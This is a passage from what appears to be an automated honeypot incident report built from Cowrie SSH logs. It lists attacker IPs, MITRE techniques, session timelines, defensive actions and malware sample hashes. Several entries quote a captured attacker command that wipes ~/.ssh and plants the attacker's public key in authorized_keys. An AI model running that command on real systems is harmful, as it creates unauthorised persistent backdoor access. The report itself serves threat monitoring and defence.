| `2026-06-06 22:08:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e50e4453b8a

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 22:08 |
| **Last Seen** | 2026-06-06 22:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:08:16` | `cowrie.session.connect` |
| `2026-06-06 22:08:16` | `cowrie.client.version` |
| `2026-06-06 22:08:16` | `cowrie.client.kex` |
| `2026-06-06 22:08:17` | `cowrie.login.success` |
| `2026-06-06 22:08:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1e71278a2e2

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 22:14 |
| **Last Seen** | 2026-06-06 22:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:14:12` | `cowrie.session.connect` |
| `2026-06-06 22:14:12` | `cowrie.client.version` |
| `2026-06-06 22:14:12` | `cowrie.client.kex` |
| `2026-06-06 22:14:13` | `cowrie.login.success` |
| `2026-06-06 22:14:13` | `cowrie.session.params` |
| `2026-06-06 22:14:13` | `cowrie.command.input` |
| `2026-06-06 22:14:13` | `cowrie.command.failed` |
| `2026-06-06 22:14:14` | `cowrie.log.closed` |
| `2026-06-06 22:14:14` | `cowrie.session.params` |
| `2026-06-06 22:14:14` | `cowrie.command.input` |
| `2026-06-06 22:14:14` | `cowrie.session.file_download` |
| `2026-06-06 22:14:14` | `cowrie.log.closed` |
| `2026-06-06 22:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adeb25c5e0bf

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 22:14 |
| **Last Seen** | 2026-06-06 22:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:14:16` | `cowrie.session.connect` |
| `2026-06-06 22:14:16` | `cowrie.client.version` |
| `2026-06-06 22:14:16` | `cowrie.client.kex` |
| `2026-06-06 22:14:17` | `cowrie.login.success` |
| `2026-06-06 22:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ef0d02aeb11

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 22:16 |
| **Last Seen** | 2026-06-06 22:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:16:06` | `cowrie.session.connect` |
| `2026-06-06 22:16:06` | `cowrie.client.version` |
| `2026-06-06 22:16:06` | `cowrie.client.kex` |
| `2026-06-06 22:16:07` | `cowrie.login.success` |
| `2026-06-06 22:16:07` | `cowrie.session.params` |
| `2026-06-06 22:16:07` | `cowrie.command.input` |
| `2026-06-06 22:16:07` | `cowrie.command.failed` |
| `2026-06-06 22:16:08` | `cowrie.log.closed` |
| `2026-06-06 22:16:08` | `cowrie.session.params` |
| `2026-06-06 22:16:08` | `cowrie.command.input` |
| `2026-06-06 22:16:08` | `cowrie.session.file_download` |
| `2026-06-06 22:16:08` | `cowrie.log.closed` |
| `2026-06-06 22:16:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acd39ffb3207

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 22:16 |
| **Last Seen** | 2026-06-06 22:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:16:10` | `cowrie.session.connect` |
| `2026-06-06 22:16:10` | `cowrie.client.version` |
| `2026-06-06 22:16:10` | `cowrie.client.kex` |
| `2026-06-06 22:16:11` | `cowrie.login.success` |
| `2026-06-06 22:16:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ad81765708

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-06-06 22:17 |
| **Last Seen** | 2026-06-06 22:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:17:01` | `cowrie.session.connect` |
| `2026-06-06 22:17:01` | `cowrie.client.version` |
| `2026-06-06 22:17:01` | `cowrie.client.kex` |
| `2026-06-06 22:17:01` | `cowrie.login.success` |
| `2026-06-06 22:17:01` | `cowrie.session.params` |
| `2026-06-06 22:17:01` | `cowrie.command.input` |
| `2026-06-06 22:17:01` | `cowrie.command.failed` |
| `2026-06-06 22:17:01` | `cowrie.log.closed` |
| `2026-06-06 22:17:02` | `cowrie.session.params` |
| `2026-06-06 22:17:02` | `cowrie.command.input` |
| `2026-06-06 22:17:02` | `cowrie.session.file_download` |
| `2026-06-06 22:17:02` | `cowrie.log.closed` |
| `2026-06-06 22:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cbce263d7a9

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-06-06 22:17 |
| **Last Seen** | 2026-06-06 22:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:17:03` | `cowrie.session.connect` |
| `2026-06-06 22:17:03` | `cowrie.client.version` |
| `2026-06-06 22:17:03` | `cowrie.client.kex` |
| `2026-06-06 22:17:04` | `cowrie.login.success` |
| `2026-06-06 22:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d06b2d2b294

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 22:19 |
| **Last Seen** | 2026-06-06 22:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:19:59` | `cowrie.session.connect` |
| `2026-06-06 22:19:59` | `cowrie.client.version` |
| `2026-06-06 22:19:59` | `cowrie.client.kex` |
| `2026-06-06 22:19:59` | `cowrie.login.success` |
| `2026-06-06 22:20:00` | `cowrie.session.params` |
| `2026-06-06 22:20:00` | `cowrie.command.input` |
| `2026-06-06 22:20:00` | `cowrie.command.failed` |
| `2026-06-06 22:20:00` | `cowrie.log.closed` |
| `2026-06-06 22:20:00` | `cowrie.session.params` |
| `2026-06-06 22:20:00` | `cowrie.command.input` |
| `2026-06-06 22:20:00` | `cowrie.session.file_download` |
| `2026-06-06 22:20:00` | `cowrie.log.closed` |
| `2026-06-06 22:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49c5145a62ad

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 22:20 |
| **Last Seen** | 2026-06-06 22:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:20:02` | `cowrie.session.connect` |
| `2026-06-06 22:20:02` | `cowrie.client.version` |
| `2026-06-06 22:20:02` | `cowrie.client.kex` |
| `2026-06-06 22:20:03` | `cowrie.login.success` |
| `2026-06-06 22:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-597dc4355bcd

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 22:29 |
| **Last Seen** | 2026-06-06 22:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:29:45` | `cowrie.session.connect` |
| `2026-06-06 22:29:45` | `cowrie.client.version` |
| `2026-06-06 22:29:45` | `cowrie.client.kex` |
| `2026-06-06 22:29:46` | `cowrie.login.success` |
| `2026-06-06 22:29:46` | `cowrie.session.params` |
| `2026-06-06 22:29:46` | `cowrie.command.input` |
| `2026-06-06 22:29:46` | `cowrie.command.failed` |
| `2026-06-06 22:29:46` | `cowrie.log.closed` |
| `2026-06-06 22:29:47` | `cowrie.session.params` |
| `2026-06-06 22:29:47` | `cowrie.command.input` |
| `2026-06-06 22:29:47` | `cowrie.session.file_download` |
| `2026-06-06 22:29:47` | `cowrie.log.closed` |
| `2026-06-06 22:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fd2b5965488

| Field | Detail |
|---|---|
| **Source IP** | `43.167.10[.]243` |
| **First Seen** | 2026-06-06 22:29 |
| **Last Seen** | 2026-06-06 22:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:29:49` | `cowrie.session.connect` |
| `2026-06-06 22:29:49` | `cowrie.client.version` |
| `2026-06-06 22:29:49` | `cowrie.client.kex` |
| `2026-06-06 22:29:49` | `cowrie.login.success` |
| `2026-06-06 22:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.167.10[.]243` to AbuseIPDB if not already reported
- [ ] Block `43.167.10[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-249c19f727db

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-06-06 22:30 |
| **Last Seen** | 2026-06-06 22:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:30:22` | `cowrie.session.connect` |
| `2026-06-06 22:30:22` | `cowrie.client.version` |
| `2026-06-06 22:30:22` | `cowrie.client.kex` |
| `2026-06-06 22:30:22` | `cowrie.login.success` |
| `2026-06-06 22:30:23` | `cowrie.session.params` |
| `2026-06-06 22:30:23` | `cowrie.command.input` |
| `2026-06-06 22:30:23` | `cowrie.command.failed` |
| `2026-06-06 22:30:23` | `cowrie.log.closed` |
| `2026-06-06 22:30:23` | `cowrie.session.params` |
| `2026-06-06 22:30:23` | `cowrie.command.input` |
| `2026-06-06 22:30:23` | `cowrie.session.file_download` |
| `2026-06-06 22:30:23` | `cowrie.log.closed` |
| `2026-06-06 22:30:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5ccaea9b5d3

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-06-06 22:30 |
| **Last Seen** | 2026-06-06 22:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 22:30:25` | `cowrie.session.connect` |
| `2026-06-06 22:30:25` | `cowrie.client.version` |
| `2026-06-06 22:30:25` | `cowrie.client.kex` |
| `2026-06-06 22:30:25` | `cowrie.login.success` |
| `2026-06-06 22:30:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `43.167.10[.]243` | **30** | 2026-06-06 21:30 | 2026-06-06 22:29 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.112[.]104` | **6** | 2026-06-06 21:38 | 2026-06-06 21:47 | 8m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `36.64.131[.]68` | **2** | 2026-06-06 22:17 | 2026-06-06 22:30 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.36.112[.]103` | 1 | 2026-06-06 22:24 | 2026-06-06 22:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.88.76[.]27` | 1 | 2026-06-06 22:31 | 2026-06-06 22:31 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.199.176[.]250` | 1 | 2026-06-06 21:28 | 2026-06-06 21:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.12.6[.]79` | 1 | 2026-06-06 21:13 | 2026-06-06 21:13 | 14s | 0 | `T1592` | 🟢 LOW |
| `156.238.236[.]179` | 1 | 2026-06-06 22:32 | 2026-06-06 22:34 | 62s | 1 | `T1110.001` | 🟢 LOW |
| `185.242.226[.]18` | 1 | 2026-06-06 21:49 | 2026-06-06 21:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.244.18[.]126` | 1 | 2026-06-06 22:28 | 2026-06-06 22:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.138.202[.]60` | 1 | 2026-06-06 21:12 | 2026-06-06 21:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.73.164[.]65` | 1 | 2026-06-06 21:12 | 2026-06-06 21:12 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
